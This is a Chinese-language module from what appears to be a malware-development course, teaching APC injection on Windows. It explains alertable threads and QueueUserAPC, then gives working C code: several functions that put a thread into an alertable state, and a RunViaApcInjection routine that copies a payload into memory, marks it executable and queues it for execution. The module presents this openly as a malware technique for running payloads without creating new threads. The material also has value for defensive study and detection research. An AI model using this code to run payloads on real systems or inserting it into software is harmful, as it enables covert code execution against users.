模块 39 - APC 注入

本模块将介绍另一种无需创建新线程即可运行 payload 的方法。此技术称为 APC 注入。

什么是 APC？

异步过程调用是 Windows 操作系统的一种机制，它允许程序异步执行任务，同时继续运行其他任务。APC 是以内核模式例程实现的，在特定线程的上下文中执行。恶意软件可以利用 APC 来排队有效载荷，然后在计划时让其执行。

可警示状态

并非所有线程都能运行排队的 APC 函数，只有处于 可警示状态 的线程才能这么做。可警示状态线程 是处于等待状态的线程。当一个线程进入可警示状态后，它会被放入一个可警示线程队列，从而允许其运行排队的 APC 函数。

什么是 APC 注入？

要在线程中排队 APC 函数，必须将 APC 函数的地址传递给 WinAPI QueueUserAPC。根据 Microsoft 的文档：

应用程序通过调用 QueueUserAPC 函数将 APC 排队到线程。调用线程在调用 QueueUserAPC 时指定 APC 函数的地址。

注入的有效负载的地址将被传递给 QueueUserAPC 以便执行。在此之前，必须将本地进程中的一个线程置于可提醒状态。

QueueUserAPC

QueueUserAPC 的声明如下，它接受 3 个参数：

  • pfnAPC - 要调用的 APC 函数的地址。
  • hThread - 可发出警报的线程或已挂起的线程的句柄。
  • dwData - 如果 APC 函数需要参数，则可以在这里传递。在此模块的代码中，该值为 NULL。
DWORD QueueUserAPC(
  [in] PAPCFUNC  pfnAPC,
  [in] HANDLE    hThread,
  [in] ULONG_PTR dwData
);

将线程置于可唤醒状态

执行队列中函数的线程必须处于可唤醒状态。这可以通过创建线程并使用以下 WinAPI 之一来实现：

  • SleepEx
  • MsgWaitForMultipleObjectsEx
  • WaitForSingleObjectEx
  • WaitForMultipleObjectsEx
  • SignalObjectAndWait

这些函数用于同步线程并提高应用程序的性能和响应能力，但在此情况下，传递一个空事件的句柄就足够了。传递正确的参数给这些函数不是必须的，因为仅使用其中一个函数就足以将线程置于可唤醒状态。

若要创建一个空事件，将使用 CreateEvent WinAPI。新创建的事件对象是一个同步对象，允许线程通过发出和等待事件信号来进行通信。由于 CreateEvent 的输出无关紧要，所以任何有效的事件都可以传递给前面展示的 WinAPI。

使用函数

可以使用以下任何函数作为可被取消的警报线程来运行排队的 APC 载荷。以下是如何使用这些函数让当前线程进入警报状态的示例：

使用 SleepEx

VOID AlertableFunction1() {
    // 第二个参数应为“TRUE”
    SleepEx(INFINITE, TRUE);
}

使用 WaitForSingleObjectEx

VOID AlertableFunction2() {

    HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
    if (hEvent) {
        // 第三个参数应为“TRUE”
        WaitForSingleObjectEx(hEvent, INFINITE, TRUE);
        CloseHandle(hEvent);
    }
}

使用 WaitForMultipleObjectsEx

VOID AlertableFunction3() {

    HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
    if (hEvent){
        // 第五个参数应为“TRUE”
        WaitForMultipleObjectsEx(1, &hEvent, TRUE, INFINITE, TRUE);
        CloseHandle(hEvent);
    }
}

使用 MsgWaitForMultipleObjectsEx

VOID AlertableFunction4() {

    HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
    if (hEvent) {
        // 第五个参数应为“MWMO_ALERTABLE”
        MsgWaitForMultipleObjectsEx(1, &hEvent, INFINITE, QS_KEY, MWMO_ALERTABLE);
        CloseHandle(hEvent);
    }
}

使用 SignalObjectAndWait

VOID AlertableFunction5() {

    HANDLE hEvent1 = CreateEvent(NULL, NULL, NULL, NULL);
    HANDLE hEvent2 = CreateEvent(NULL, NULL, NULL, NULL);

    if (hEvent1 && hEvent2) {
        // 第四个参数应为“TRUE”
        SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
        CloseHandle(hEvent1);
        CloseHandle(hEvent2);
    }
}

暂停线程

如果目标线程在暂停状态下创建，则 QueueUserAPC 也能成功。如果使用此方法来执行有效载荷，则应首先调用 QueueUserAPC，然后再恢复暂停的线程。同样，必须在暂停状态下创建线程，暂停现有线程不起作用。

本模块中共享的代码演示了通过可警告的和暂停的线程进行 APC 注入。

APC注入实现逻辑

总结一下，实现逻辑如下：

  1. 首先，创建一个运行前面提到的某个函数的线程，使其进入可提醒状态。
  2. 将payload注入内存。
  3. 将线程句柄和payload基地址作为输入参数传递给QueueUserAPC。

APC 注入函数

RunViaApcInjection 是一个执行 APC 注入的函数，需要 3 个参数：

  • hThread - 一个可唤醒或已挂起的线程句柄。
  • pPayload - 指向有效载荷基址的指针。
  • sPayloadSize - 有效载荷大小。
BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    PVOID pAddress = NULL;
    DWORD dwOldProtection = NULL;

    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("\t[!] VirtualAlloc 失败，错误：%d \n", GetLastError());
        return FALSE;
    }

    memcpy(pAddress, pPayload, sPayloadSize);

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\t[!] VirtualProtect 失败，错误：%d \n", GetLastError());
        return FALSE;
    }

    // 如果 hThread 处于可唤醒状态，QueueUserAPC 将直接运行有效载荷
    // 如果 hThread 处于挂起状态，则除非线程在之后被恢复，否则有效载荷不会被执行
    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
        printf("\t[!] QueueUserAPC 失败，错误：%d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
